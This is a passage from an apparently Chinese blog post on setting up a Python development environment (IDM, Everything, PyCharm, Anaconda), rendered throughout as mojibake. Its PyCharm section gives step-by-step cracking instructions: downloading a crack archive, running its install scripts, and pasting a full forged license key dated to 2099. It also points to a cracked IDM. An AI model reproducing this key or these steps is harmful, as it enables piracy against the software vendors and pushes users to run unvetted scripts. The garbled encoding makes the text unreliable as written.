Manager)</p>\n</blockquote>\n<p>è¿™ä¸ªè½¯ä»¶ä¸‹è½½é€Ÿåº¦æ²¡å¾—è¯´ï¼Œå¾ˆå¿«ï¼Œæ”¯æŒå¤šçº¿ç¨‹ï¼Œä½†æ˜¯éœ€è¦ä»˜è´¹ï¼Œè¿™é‡Œæä¾›ä¸€ä¸ªéžå¸¸å¥½ç”¨çš„ç‰ˆæœ¬å’Œç ´è§£è½¯ä»¶</p>\n<p>å…·ä½“ä¸‹è½½ä¸Žæ¿€æ´»æ–¹æ³•å‚è€ƒè¿™ç¯‡æ–‡ç« <a href=\"https://www.cnblogs.com/lichengxiao/p/19486631\" target=\"_blank\">IDMä¸‹è½½å®‰è£…åŠæ¿€æ´»æ•™ç¨‹ - ç†¬å¤œä¸æ—©ç¡ - åšå®¢å›­</a></p>\n<p><img alt=\"image-20260115140018486\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092324229-1650844361.png\" /></p>\n<blockquote>\n<p>Windowsç”µè„‘æ£€ç´¢å·¥å…·ï¼š<strong><code>Everything</code></strong></p>\n</blockquote>\n<p>å®˜æ–¹ç½‘ç«™ï¼š<a href=\"https://www.voidtools.com/zh-cn/downloads/\" rel=\"noopener nofollow\" target=\"_blank\">Everythingä¸‹è½½ - voidtools</a></p>\n<p>å®˜æ–¹å®‰è£…æ•™ç¨‹ï¼š<a href=\"https://www.voidtools.com/zh-cn/support/everything/installing_everything/\" rel=\"noopener nofollow\" target=\"_blank\">Installing Everything - voidtools</a></p>\n<p>è¿™ä¸ªè½¯ä»¶æ²¡å¾—è¯´ï¼Œæ£€ç´¢ç”µè„‘å·¥å…·å¿«çš„ä¸€æ‰¹</p>\n<p><img alt=\"image-20260115135932604\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092323274-543947612.png\" /></p>\n<h2 id=\"çŽ¯å¢ƒå®‰è£…\">çŽ¯å¢ƒå®‰è£…</h2>\n<h3 id=\"pycharmæœ€æ–°ç‰ˆå®‰è£…æ¿€æ´»\">pyCharmæœ€æ–°ç‰ˆå®‰è£…æ¿€æ´»</h3>\n<h4 id=\"1å®‰è£…pycharm\">1.å®‰è£…PyCharm</h4>\n<blockquote>\n<p>â—ç”³æ˜Žï¼šæœ¬æ•™ç¨‹ Pycharm ç ´è§£è¡¥ä¸ã€æ¿€æ´»ç å‡æ”¶é›†äºŽç½‘ç»œï¼Œè¯·å‹¿å•†ç”¨ï¼Œä»…ä¾›ä¸ªäººå­¦ä¹ ä½¿ç”¨ï¼Œå¦‚æœ‰ä¾µæƒï¼Œè¯·è”ç³»ä½œè€…åˆ é™¤ã€‚è‹¥æ¡ä»¶å…è®¸ï¼Œå¸Œæœ›å¤§å®¶è´­ä¹°æ­£ç‰ˆ ï¼</p>\n<p>â—æœ¬æ–‡PyCharmæ¿€æ´»éƒ¨åˆ†å€Ÿé‰´<a href=\"https://www.quanxiaoha.com/pycharm-pojie/pycharm-pojie-2025311.html\" rel=\"noopener nofollow\" target=\"_blank\">Pycharm 2025.3.1.1 æœ€æ–°ç ´è§£ç‰ˆå®‰è£…æ•™ç¨‹ï¼ˆäº²æµ‹è‡³2099å¹´~ï¼‰ - çŠ¬å°å“ˆæ•™ç¨‹</a>ï¼Œå¦‚æœ‰ä¾µæƒè¯·è”ç³»åˆ é™¤</p>\n</blockquote>\n<p><a href=\"https://www.jetbrains.com/zh-cn/pycharm/\" rel=\"noopener nofollow\" target=\"_blank\">JetBrainså®˜ç½‘å®‰è£…ä¸‹è½½</a></p>\n<p>è¿›å…¥å®˜ç½‘ç½‘å€åŽç›´æŽ¥ç‚¹å‡»ä¸‹è½½</p>\n<p><img alt=\"image-20260115101353676\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092322526-542856634.png\" /></p>\n<p><img alt=\"image-20260115141156992\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092322064-1689371325.png\" /></p>\n<p><img alt=\"image-20260115141209324\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092321576-2115049027.png\" /></p>\n<p>ä¸‹è½½å®ŒæˆåŽï¼ŒæŒ‰ç…§ä»¥ä¸‹æ“ä½œå®Œæˆå®‰è£…ï¼š</p>\n<ol>\n<li>åŒå‡» <code>.exe</code> å®‰è£…åŒ…å¼€å§‹å®‰è£… Pycharmï¼›</li>\n<li>ç‚¹å‡»<strong>ä¸‹ä¸€æ­¥</strong>æŒ‰é’®ï¼›</li>\n<li>è‡ªå®šä¹‰ Pycharm çš„å®‰è£…è·¯å¾„ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©å®‰è£…åœ¨äº† <code>E:/</code> ç›˜ä¸‹ï¼Œç‚¹å‡»<strong>ä¸‹ä¸€æ­¥</strong>æŒ‰é’®ï¼›</li>\n<li><strong>å‹¾é€‰åˆ›å»ºæ¡Œé¢å¿«æ·æ–¹å¼</strong>ï¼Œç‚¹å‡»<strong>ä¸‹ä¸€æ­¥</strong>æŒ‰é’®ï¼›</li>\n<li>ç‚¹å‡»<strong>å®‰è£…</strong>æŒ‰é’®ï¼›</li>\n<li>ç­‰å¾…å®‰è£…æˆåŠŸ...ï¼›</li>\n<li>å®‰è£…æˆåŠŸåŽï¼Œ<strong>å…ˆä¸è¦å‹¾é€‰è¿è¡Œ Pycharm</strong>, ç›´æŽ¥ç‚¹å‡»<strong>å®Œæˆ</strong>æŒ‰é’®ï¼Œå®Œæ¯•å¼¹æ¡†ï¼Œå‡†å¤‡å¼€å§‹è¿›å…¥ç ´è§£æ­¥éª¤ï¼›</li>\n</ol>\n<p><img alt=\"Pycharm 2025.3.1.1 å®‰è£…æ­¥éª¤\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092321116-1954803598.jpg\" /></p>\n<h4 id=\"2ä¸‹è½½ç ´è§£è„šæœ¬\">2.ä¸‹è½½ç ´è§£è„šæœ¬</h4>\n<p><a href=\"https://files.cnblogs.com/files/blogs/726269/jetbra-pojie.zip?t=1768457963&amp;download=true\" target=\"_blank\">ç‚¹å‡»æ­¤å¤„å³å¯å¼€å§‹ä¸‹è½½</a></p>\n<p>ä¸‹è½½æˆåŠŸåŽï¼Œæ˜¯ä¸ªåŽ‹ç¼©åŒ…ï¼Œæˆ‘è¿™é‡Œè§£åŽ‹åˆ°äº† <code>E:\\pojie\\jihuo2099</code> æ–‡ä»¶å¤¹ä¸‹ã€‚æ³¨æ„ï¼Œå°†å®ƒ<strong>è§£åŽ‹åˆ°ä¸€ä¸ªè·¯å¾„ä¸­æ²¡æœ‰ â€œä¸­æ–‡â€ï¼Œâ€œç©ºæ ¼â€ çš„ä½ç½®</strong>ï¼Œä¸€å®šè¦è¿™ä¹ˆåšï¼Œä¸ç„¶ä¼šå¯¼è‡´ç ´è§£å¤±è´¥ï¼ï¼ï¼</p>\n<p>è§£åŽ‹æˆåŠŸåŽï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p>\n<p><img alt=\"JetBrains å…¨å®¶æ¡¶æ¿€æ´»è„šæœ¬\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092319792-1196265869.jpg\" /></p>\n<h4 id=\"3å¼€å§‹æ¿€æ´»\">3.å¼€å§‹æ¿€æ´»</h4>\n<p>è¿›å…¥åˆ° <code>/scripts</code> è„šæœ¬æ–‡ä»¶å¤¹ä¸‹ï¼Œæœ‰ä¸¤ä¸ª <code>install</code> å‰ç¼€çš„è„šæœ¬ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>\n<ul>\n<li><code>install.sh</code> : Mac æˆ– Linux ç³»ç»Ÿï¼Œæ‰§è¡Œæ­¤è„šæœ¬ï¼›</li>\n<li><code>install-all-users.vbs</code> : Windows ç³»ç»Ÿï¼Œç‚¹å‡»æ‰§è¡Œæ­¤è„šæœ¬ï¼›</li>\n</ul>\n<p><img alt=\"æ‰§è¡Œç ´è§£è„šæœ¬\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092318860-1026268258.jpg\" /></p>\n<p>åŒå‡» <em>install-all-user.vbs</em> è„šæœ¬ ï¼Œè¡¨ç¤ºä¸ºå½“å‰ç³»ç»Ÿæ‰€æœ‰ç”¨æˆ·æ‰§è¡Œç ´è§£ã€‚ç„¶åŽï¼Œç‚¹å‡»å¼¹æ¡†ä¸­çš„<strong>ç¡®å®š</strong>æŒ‰é’®ï¼Œéœ€è¦ç­‰å¾…ä¸ª 10s - 30s æ—¶é—´ï¼ˆéƒ¨åˆ†ç”¨æˆ·å¯èƒ½éœ€è¦ç­‰å¾…å¥½å‡ åˆ†é’Ÿï¼Œæœ¬äººå°±æ˜¯ï¼Œæ‰€ä»¥ï¼Œè€å¿ƒç­‰å¾…ä¸€ä¼šå°±è¡Œï¼Œä¸è¦æ€¥~ï¼‰ã€‚</p>\n<blockquote>\n<p><strong>æ³¨æ„</strong>:</p>\n<ul>\n<li>å¦‚æžœæ‰§è¡Œè„šæœ¬ï¼Œæç¤º <code>jar-netfilter.jar not found</code>, å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼šã€Š<a href=\"https://www.quanxiaoha.com/article/jar-netfilter-not-found.html\" rel=\"noopener nofollow\" target=\"_blank\">â€œjar-netfilter.jar not foundâ€ åŽŸå› åŠè§£å†³æ–¹æ¡ˆ</a> ã€‹ã€‚</li>\n<li>å¦‚æžœæ‰§è¡Œè„šæœ¬ï¼Œæç¤ºä½  â€œ<strong>æœªå®‰è£… IDE</strong>â€, å…ˆæ‰“å¼€ä¸€ä¸‹ IDE, è®©è„šæœ¬è¯†åˆ«åˆ°ï¼Œå†æ‰§è¡Œè„šæœ¬ã€‚å¦‚æžœæ²¡æç¤ºï¼Œåˆ™ä¸ç”¨ç®¡ã€‚</li>\n</ul>\n</blockquote>\n<p><img alt=\"ç ´è§£æˆåŠŸï¼Œä¼šæç¤º Done\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092318146-1850170457.png\" /></p>\n<p>å½“æç¤ºä¸Šå›¾æ‰€ç¤ºçš„ <code>Done</code> , åˆ™è¡¨ç¤ºè„šæœ¬æ‰§è¡ŒæˆåŠŸï¼Œç»§ç»­åŽé¢çš„æ­¥éª¤ã€‚</p>\n<h4 id=\"4å¯åŠ¨ide-è¾“å…¥æŒ‡å®šæ¿€æ´»ç \">4.å¯åŠ¨IDE, è¾“å…¥æŒ‡å®šæ¿€æ´»ç </h4>\n<p>æ¿€æ´»æˆåŠŸåŽï¼ŒåŒå‡»æ¡Œé¢çš„ Pycharm å¿«æ·å¯åŠ¨å›¾æ ‡ï¼Œæ¥æ‰“å¼€ Pycharm ã€‚æ³¨æ„ï¼Œ2024.2 ä¹‹åŽçš„ç‰ˆæœ¬ï¼Œè‹¥åˆæ¬¡å®‰è£…ï¼Œä¼šæç¤ºé€‰æ‹©æ‰€åœ¨åŒºåŸŸï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå¦‚æžœé€‰æ‹©äº† <code>China Mainland</code>ï¼Œä¼šåœ¨æ¿€æ´»çš„æ—¶å€™åå¤è·³å‡ºæ¿€æ´»ç å¹¶æç¤ºæ¿€æ´»ç æ— æ•ˆï¼ŒåŽŸå› æ˜¯æ–°ç‰ˆæœ¬ä¼šæ‹¦æˆª <code>.cn</code> åŸŸåï¼Œå¯¼è‡´æ¿€æ´»è®¸å¯è¢«åŠé”€ï¼Œæ‰€ä»¥ï¼Œ<strong>åƒä¸‡ä¸è¦æŒ‡å®šåŒºåŸŸ</strong>ï¼ï¼</p>\n<p><img alt=\"img\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092317702-653935610.jpg\" /></p>\n<p>å¦‚æžœæ˜¯è€ç”¨æˆ·ï¼Œåˆ™å¯ä»¥åœ¨ <code>Settings</code> è®¾ç½®èœå•ä¸­æ¥æ›´æ”¹ï¼ˆ<strong>ä¸€å®šè¦æ›´æ”¹</strong>ï¼‰ï¼š</p>\n<p><img alt=\"img\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092317337-68574309.png\" /></p>\n<p>ç„¶åŽï¼Œç‚¹å‡»<em>å³ä¸‹è§’å°é½¿è½® | Manage Licenses</em> å‡†å¤‡å¼€å§‹æ¿€æ´» Pycharmï¼Œå¦‚ä¸‹å›¾ï¼š</p>\n<p><img alt=\"img\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092316991-1303352422.jpg\" /></p>\n<p>å‹¾é€‰ <code>Activation code</code> ï¼Œä»¥æ¿€æ´»ç çš„æ–¹å¼æ¥æ¿€æ´»ï¼Œå¤åˆ¶ä¸‹é¢æŒ‡å®šæ¿€æ´»ç ï¼Œè¾“å…¥åŽï¼Œç‚¹å‡» <code>Activate</code> æ¿€æ´»æŒ‰é’®å³å¯æ¿€æ´»æˆåŠŸå•¦, <strong>æ³¨æ„ï¼Œéƒ¨åˆ†å°ä¼™ä¼´ä¼šæç¤º <code>Key is invalid</code>, ä¸å¦¨é‡å¯ä¸€ä¸‹ç”µè„‘å†è¾“å…¥æ¿€æ´»è¯•è¯•</strong>ï¼ŒåŸºæœ¬ä¸Šéƒ½èƒ½æˆåŠŸï¼š</p>\n<pre><code>ND2HORWZG1-eyJsaWNlbnNlSWQiOiJORDJIT1JXWkcxIiwibGljZW5zZWVOYW1lIjoiXHU2ZGQ4XHU1YjlkXHU1ZTk3XHU5NGZhXHVmZjFhXHU3ZWEyXHU1YmEyXHU4ZjZmXHU0ZWY2IiwibGljZW5zZWVUeXBlIjoiUEVSU09OQUwiLCJhc3NpZ25lZU5hbWUiOiIiLCJhc3NpZ25lZUVtYWlsIjoiIiwibGljZW5zZVJlc3RyaWN0aW9uIjoiIiwiY2hlY2tDb25jdXJyZW50VXNlIjpmYWxzZSwicHJvZHVjdHMiOlt7ImNvZGUiOiJJSSIsImZhbGxiYWNrRGF0ZSI6IjIwMjQtMTAtMTciLCJwYWlkVXBUbyI6IjIwOTktMTItMzAiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUENXTVAiLCJmYWxsYmFja0RhdGUiOiIyMDI0LTEwLTE3IiwicGFpZFVwVG8iOiIyMDk5LTEyLTMwIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBTSSIsImZhbGxiYWNrRGF0ZSI6IjIwMjQtMTAtMTciLCJwYWlkVXBUbyI6IjIwOTktMTItMzAiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFMiLCJmYWxsYmFja0RhdGUiOiIyMDI0LTEwLTE3IiwicGFpZFVwVG8iOiIyMDk5LTEyLTMwIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IkFDIiwiZmFsbGJhY2tEYXRlIjoiMjAyNC0xMC0xNyIsInBhaWRVcFRvIjoiMjA5OS0xMi0zMCIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJEQiIsImZhbGxiYWNrRGF0ZSI6IjIwMjQtMTAtMTciLCJwYWlkVXBUbyI6IjIwOTktMTItMzAiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUERCIiwiZmFsbGJhY2tEYXRlIjoiMjAyNC0xMC0xNyIsInBhaWRVcFRvIjoiMjA5OS0xMi0zMCIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJSTSIsImZhbGxiYWNrRGF0ZSI6IjIwMjQtMTAtMTciLCJwYWlkVXBUbyI6IjIwOTktMTItMzAiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiV1MiLCJmYWxsYmFja0RhdGUiOiIyMDI0LTEwLTE3IiwicGFpZFVwVG8iOiIyMDk5LTEyLTMwIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlJEIiwiZmFsbGJhY2tEYXRlIjoiMjAyNC0xMC0xNyIsInBhaWRVcFRvIjoiMjA5OS0xMi0zMCIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJDTCIsImZhbGxiYWNrRGF0ZSI6IjIwMjQtMTAtMTciLCJwYWlkVXBUbyI6IjIwOTktMTItMzAiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUEMiLCJmYWxsYmFja0RhdGUiOiIyMDI0LTEwLTE3IiwicGFpZFVwVG8iOiIyMDk5LTEyLTMwIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IkdPIiwiZmFsbGJhY2tEYXRlIjoiMjAyNC0xMC0xNyIsInBhaWRVcFRvIjoiMjA5OS0xMi0zMCIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJEUyIsImZhbGxiYWNrRGF0ZSI6IjIwMjQtMTAtMTciLCJwYWlkVXBUbyI6IjIwOTktMTItMzAiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiREMiLCJmYWxsYmFja0RhdGUiOiIyMDI0LTEwLTE3IiwicGFpZFVwVG8iOiIyMDk5LTEyLTMwIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IkRQTiIsImZhbGxiYWNrRGF0ZSI6IjIwMjQtMTAtMTciLCJwYWlkVXBUbyI6IjIwOTktMTItMzAiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiRFAiLCJmYWxsYmFja0RhdGUiOiIyMDI0LTEwLTE3IiwicGFpZFVwVG8iOiIyMDk5LTEyLTMwIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IkRNIiwiZmFsbGJhY2tEYXRlIjoiMjAyNC0xMC0xNyIsInBhaWRVcFRvIjoiMjA5OS0xMi0zMCIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJRQSIsImZhbGxiYWNrRGF0ZSI6IjIwMjQtMTAtMTciLCJwYWlkVXBUbyI6IjIwOTktMTItMzAiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUlIiLCJmYWxsYmFja0RhdGUiOiIyMDI0LTEwLTE3IiwicGFpZFVwVG8iOiIyMDk5LTEyLTMwIiwiZXh0ZW5kZWQiOnRydWV9XSwibWV0YWRhdGEiOiIwMTIwMjQwNDEyUFBBTTAwMDAwNSIsImhhc2giOiI1NjM1MTMyN1wvMDoxNTQyMjc2MDc0IiwiZ3JhY2VQZXJpb2REYXlzIjo3LCJhdXRvUHJvbG9uZ2F0ZWQiOnRydWUsImlzQXV0b1Byb2xvbmdhdGVkIjp0cnVlLCJ0cmlhbCI6ZmFsc2UsImFpQWxsb3dlZCI6dHJ1ZX0=-kW91OBeQXp5LbxNibDtGcNjew0OKz8HATUHf86l24YWMmyN4G/xjRFPjBMR+BCrh8oO3Or9i8UF0HxVjXzI9aS7IjhlmVVwk7LCgTVThUarhgIfoLQx1JYuLLYG7X95Z0LkP6VpiwdaxDdR1eD2KRqDPXUOxnydqhbxkoqUqf7/bnhue5evESIfLqtzF7Lv010sr6DvDLMPANGVVW7kUJR6WhF9AOUZGr6CJj8j3V075vBYzPPKhqUOatyuxfTS4avbZ7TZYIWu8bciAdciK/hB3Z4EphTra19mOXclJNvJUEpNpW0c7wA2rvyhm+Pvs3AfSk3u6AXZqCt2ZFjWhEd8IqP2qHkjCBg/f+Z1m0qPOlmUmvsbmmRUgZDQKaOUAtDpXWp6WeygI8OzONLgq7K/vbFclu0U+waOUtvm9u6Was6TgmY2yWuITqu1ck8RliW4hDaCaRyeazgiszGKmNFaaUJMUOlpJLRreVM7Ey2VkwQKVm4WVL/359qsGhvI5+vDoaq6NDTg9aXS0gc++48glYGiAgwGNroVDP9gDKfRhULogVspjwFHr+ZD/yK46oiKTlicDurH3QhQDhtJEs3BsUoBuT6TQt8eBJoTsZ3tQGm7Jx73/wpttz6cUzboLZ0mncqd1oCN8PELOfHAqhpTNtxTLbK6hpJ5i54T+/Yc=-LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUVxakNDQXBLZ0F3SUJBZ0lHQVkzemdyR0xNQTBHQ1NxR1NJYjNEUUVCQ3dVQU1CZ3hGakFVQmdOVkJBTU0KRFVwbGRGQnliMlpwYkdVZ1EwRXdIaGNOTWpRd01qSTNNVFl3TURBd1doY05NelF3TWpJM01UWXdNREF3V2pBVQpNUkl3RUFZRFZRUUREQWxxWlhSaWNtRnBibk13Z2dJaU1BMEdDU3FHU0liM0RRRUJBUVVBQTRJQ0R3QXdnZ0lLCkFvSUNBUUMvaStCR1cxWFZRVyswb1BFSXhBazNaN1ZOSnVJWUJTZ2ZWMnBZY09UUWJFMjhXSUR4V0FmWUk3cS8KOFNicVdoRXF2SVU1UElnSjNxSENCODF6L0xSV1ZxSlRWZ1U5ZjVhWm44QkM0QW9JS2t4SXAvT2sxQ3NCUHFUTgpTODlaeWdaOVRrOTNjTmVES3RhUHZySzFlUDhDZzRTeEQ1U2ZsWWVLbWVEbjM4VVh0MWM4YVN1a0ZlaGxvZUxWCkgzSFcxSEdCMDVXTHNldHhLWEhLditKUmJSai9vNHdCKzFaYjB4VUx1Z05CRUE1bVpDcjM2dnBJemR3OFdHUDcKRWFLMDFZZGRvTkVsZVgwcjhBUWVXaTlKSVB0OXFDNXlQeXlZdCsrNFhMZng1NnJjNFU4YkJUb04vaDV3SlNvawoxYVJkVnp5MkpMWTAyNHF4ZXF3dk5kRzZ0TitrenNLZks2RXQ0VzA1MkMwZFBpeHhBNDZ0SThlTTVpUExoSWdTClZUMU5EQ3pCNGpib0FwS3JjdnJUc3lONDJyTWhrc1ltYXBQOW9Mdy9GM2xISXZSTnlPZDNBb2hGR1JVTWVXK3AKYm9ISjZYNHdlQTVsR0JKb0tPKzVyVEE0TFl4WDg2QXRWUWlHM3pXZW1kVmxwRWxIMkZHZHNiQkpjdHFUWm5DbwpJUW9oaGpBcE5STE1iZHExZVVDNjhpemIyOHFzWHRQZGh5K2hUckR6RXJTTE9lQkNpODh5YTJrMURoYllrejVsCnFYRExQRG5OZVdLRmVEbHBNeS8ycDRaNVFVTzNRZ0NOeUUzbFZLRG05Y05sb0N5VlQ2S3JrekhVZVpIV0NJK1cKS011QXFweHkxWDFVcnpWSHdFTnRDUDZNVlY1cmE4M21vQWJvQXl1dWJkMGJvdS81ZFFJREFRQUJNQTBHQ1NxRwpTSWIzRFFFQkN3VUFBNElDQVFCeENMNXIxU0NZNmdqSlIwdHJTZ3pYaStEZUlvZVZaemg3SkJBcTR3WmdDWW9aCnRYT3A5TTdWUEZTRmFBNlRBMTU4b0w5RWlRdnVsd2JIUjV4MHllQVVYQXhQdE1sam95VmM1dzRqRDZhVFhkeXQKU3ZRdUZyWWlCU1JWU0dueloxY1pKUVFhSzFhWDR5dmhyU0F5bnB5RkJEdUlUaVl2bDQvbDdTN3JTRDdKTjdaWQpzUlJjWHBwWVRDMDBhTHJ3UUxEdk5qSzhSNUoxMk03cTFHWjhqNGpHcVV6Yk9nV1VoTFJKUmg1Z0ExUTdYbmUrCjlSdE1BblVVQk9OUjFVQzNMWXNZbjRIZ3VEUGdHYXBDdktEQXZoU2NFbUs2S2JNQkY5eTlTSzc3aHFueWV1VUsKMHBDNWdybWo1TjByUEhYL1gwcmZrMldDaDgwM2dpdnpRWVAyOWdTMzRaeTk2Y3RKeWJaZUU0dklSdWdFT3JKTQpUUHdvR0UwOG5MVjNJOEZwTS9NOWFhZ3R6WE10OC9PaTFMczB3d1RJQUdMTGNJVUVxNDVjcElGa2xzSzFydjFRClRhcDRZT1dTSUN1Nkd0Tis0MFhIVTRxNDRPdFJMQ3ZXR2tWZ002Wk40RlRnQWJseUtYeDdoT1ZSN3V6UlhWcXUKRUE5WHlWVDV3RDBCaWpUSVkrS1Y0RHNFNmNUeXd5OU85Kzl5byszeW82a2k5VDJMeFkrZkRVTlIxY2dvY0tnaApHUmhEREhjQlFZSlMwaGcyZUJUcnFPTUpMUUU3ckV3NC9RQXdNanNiTEVOUENtb3orZjFhVmVUYTk3SGZkaks0CjlkRUczZmRLaDI3dHFGMFRZazRkVlVMUy9CU2FSd2R6UHdoNm4vVkZmeXllMmFzazNFL3QwT2pnTks1TVNRPT0KLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQo=\n</code></pre>\n<h4 id=\"5å¸¸è§é—®é¢˜\">5.å¸¸è§é—®é¢˜</h4>\n<p><strong>è¾“å…¥æ¿€æ´»ç ï¼Œæç¤ºï¼š<code>Key is invalid</code>ï¼Œå¦‚ä½•è§£å†³ï¼Ÿ</strong></p>\n<p>éƒ¨åˆ†å°ä¼™ä¼´è¾“å…¥æ¿€æ´»ç ï¼Œç‚¹å‡»æ¿€æ´»åŽï¼Œå‡ºæç¤ºï¼š<code>Key is invalid</code> çš„æƒ…å†µï¼Œå…·ä½“åŽŸå› å’Œè§£å†³åŠžæ³•ï¼Œå¯ä»¥çœ‹è¿™é‡Œï¼š<a href=\"https://www.quanxiaoha.com/idea-pojie/ide-key-is-invalid.html\" rel=\"noopener nofollow\" target=\"_blank\">https://www.quanxiaoha.com/idea-pojie/ide-key-is-invalid.html</a></p>\n<h3 id=\"anacondaå®‰è£…\">Anacondaå®‰è£…</h3>\n<p>Anaconda æ˜¯ä¸€ä¸ªå¼€æºçš„Pythonå’ŒRè¯­è¨€çš„å‘è¡Œç‰ˆæœ¬ï¼Œä¸»è¦ç”¨äºŽæ•°æ®ç§‘å­¦ã€æœºå™¨å­¦ä¹ å’Œç§‘å­¦è®¡ç®—ã€‚å®ƒåŒ…å«äº†å¤§é‡çš„ç§‘å­¦è®¡ç®—åº“å’Œå·¥å…·ï¼Œå¹¶ä¸”æä¾›äº†ä¸€ä¸ªæ–¹ä¾¿çš„çŽ¯å¢ƒç®¡ç†å·¥å…·ï¼Œä½¿å¾—ç”¨æˆ·å¯ä»¥è½»æ¾åœ°åˆ›å»ºã€ç®¡ç†å’Œåˆ‡æ¢ä¸åŒçš„ Python çŽ¯å¢ƒã€‚</p>\n<p>åœ¨é…ç½®æ·±åº¦å­¦ä¹ çŽ¯å¢ƒçš„æ—¶å€™ï¼Œå¹¶ä¸æ˜¯ä»Žpythonå®˜ç½‘ä¸‹è½½pythonç„¶åŽä½¿ç”¨pipå‘½ä»¤å®‰è£…ï¼Œæ›´å¤šçš„æ˜¯ä½¿ç”¨Anacondaè¿™ä¸ªè½¯ä»¶ã€‚</p>\n<p>å®‰è£…Anacondaä¼šé»˜è®¤å®‰è£…å¾ˆå¤šä¸œè¥¿ï¼ŒåŒ…æ‹¬pythonçš„çŽ¯å¢ƒã€condaå‘½ä»¤ï¼Œcondaå‘½ä»¤å¯ä»¥å®‰è£…å…¶ä»–çš„åº“(conda install åŒ…å)å’Œpipå·®ä¸å¤šã€‚</p>\n<p>pipå’Œcondaç±»ä¼¼äºŽåº”ç”¨å•†åº—ï¼Œå„ç§çš„åŒ…ç±»ä¼¼äºŽå„ç§çš„APPï¼Œä¸åŒåº”ç”¨å•†åº—çš„ä¸‹è½½å®‰è£…é€Ÿåº¦ä¼šæœ‰æ‰€å·®å¼‚ï¼Œå¹¶ä¸”ä¼šç»´æŠ¤è½¯ä»¶ï¼ŒåŒæ ·çš„ï¼Œpipå’Œcondaä¹Ÿä¼šç»´æŠ¤åŒ…å’Œåº“</p>\n<blockquote>\n<p>æ—¢ç„¶pipä¹Ÿå¯ä»¥å®‰è£…åŒ…å’Œåº“ï¼Œä¸ºä»€ä¹ˆä½¿ç”¨Anacondaå‘¢ï¼Ÿ</p>\n</blockquote>\n<p>Anacondaçš„ä¸€ä¸ªé‡è¦åŠŸèƒ½ï¼šè™šæ‹ŸçŽ¯å¢ƒï¼Œç”±äºŽä¸åŒçš„é¡¹ç›®å¯èƒ½ä¼šä½¿ç”¨ä¸åŒçš„çŽ¯å¢ƒï¼Œï¼ˆä¾‹å¦‚Aé¡¹ç›®è¦ç”¨Pytorch1.10ç‰ˆæœ¬è€ŒBé¡¹ç›®è¦ä½¿ç”¨1.4ç‰ˆæœ¬ï¼‰ï¼ŒAnacondaå¯ä»¥åˆ›å»ºå¤šä¸ªè™šæ‹ŸçŽ¯å¢ƒæ¥ç‹¬ç«‹ç»´æŠ¤ä¸åŒé¡¹ç›®éœ€è¦ç”¨åˆ°çš„åŒ…ï¼Œä½¿ä¸¤ä¸ªé¡¹ç›®çŽ¯å¢ƒäº’ä¸å¹²æ‰°</p>\n<p>å®˜ç½‘ä¸‹è½½åœ°å€ï¼š<a href=\"https://www.anaconda.com/download\" rel=\"noopener nofollow\" target=\"_blank\">Download Anaconda Distribution | Anaconda</a></p>\n<p><img alt=\"image-20260115144404570\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092316592-375553355.png\" /></p>\n<p>ç‚¹å‡»Get Startedï¼Œå¯èƒ½ä¼šéœ€è¦æ³¨å†Œè´¦å·å®‰è£…ï¼Œç”±äºŽæ˜¯å›½å¤–ç½‘ç«™ï¼Œä¸‹è½½é€Ÿåº¦å¯èƒ½ä¼šæ…¢ï¼Œå»ºè®®ç›´æŽ¥æ¸…åŽå›­ä¸‹è½½</p>\n<blockquote>\n<p><a href=\"https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/?C=M&amp;O=D\" rel=\"noopener nofollow\" 